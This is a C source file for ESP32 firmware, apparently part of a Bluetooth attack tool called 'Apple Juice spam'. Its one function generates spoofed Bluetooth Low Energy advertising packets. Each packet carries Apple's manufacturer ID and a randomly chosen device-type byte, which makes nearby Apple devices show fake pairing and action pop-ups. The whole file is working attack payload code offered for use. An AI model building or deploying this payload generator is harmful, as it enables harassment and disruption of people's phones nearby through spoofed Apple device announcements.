// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "apple_juice_spam.h"

#include <string.h>

#include "esp_random.h"

static const char *TAG = "APPLE_JUICE_SPAM";

#define IOS1_PAYLOAD_SIZE 31
#define IOS2_PAYLOAD_SIZE 23

static const uint8_t IOS1_DEVICE_TYPES[] = {0x02,
                                            0x0e,
                                            0x0a,
                                            0x0f,
                                            0x13,
                                            0x14,
                                            0x03,
                                            0x0b,
                                            0x0c,
                                            0x11,
                                            0x10,
                                            0x05,
                                            0x06,
                                            0x09,
                                            0x17,
                                            0x12,
                                            0x16};
#define IOS1_DEVICE_TYPES_COUNT (sizeof(IOS1_DEVICE_TYPES) / sizeof(IOS1_DEVICE_TYPES[0]))

static const uint8_t IOS2_DEVICE_TYPES[] = {
    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
#define IOS2_DEVICE_TYPES_COUNT (sizeof(IOS2_DEVICE_TYPES) / sizeof(IOS2_DEVICE_TYPES[0]))

int generate_apple_juice_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL)
    return 0;

  int rand_choice = esp_random() % 2;
  if (rand_choice == 0) {
    uint8_t device_byte = IOS1_DEVICE_TYPES[esp_random() % IOS1_DEVICE_TYPES_COUNT];
    uint8_t packet[IOS1_PAYLOAD_SIZE] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, device_byte,
                                         0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                         0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    if (max_len < IOS1_PAYLOAD_SIZE)
      return 0;
    memcpy(buffer, packet, IOS1_PAYLOAD_SIZE);
    return IOS1_PAYLOAD_SIZE;
  } else {
    uint8_t device_byte = IOS2_DEVICE_TYPES[esp_random() % IOS2_DEVICE_TYPES_COUNT];
    uint8_t packet[IOS2_PAYLOAD_SIZE] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04,        0x2a, 0x00,
                                         0x00, 0x00, 0x0f, 0x05, 0xc1, device_byte, 0x60, 0x4c,
                                         0x95, 0x00, 0x00, 0x10, 0x00, 0x00,        0x00};
    if (max_len < IOS2_PAYLOAD_SIZE)
      return 0;
    memcpy(buffer, packet, IOS2_PAYLOAD_SIZE);
    return IOS2_PAYLOAD_SIZE;
  }
}
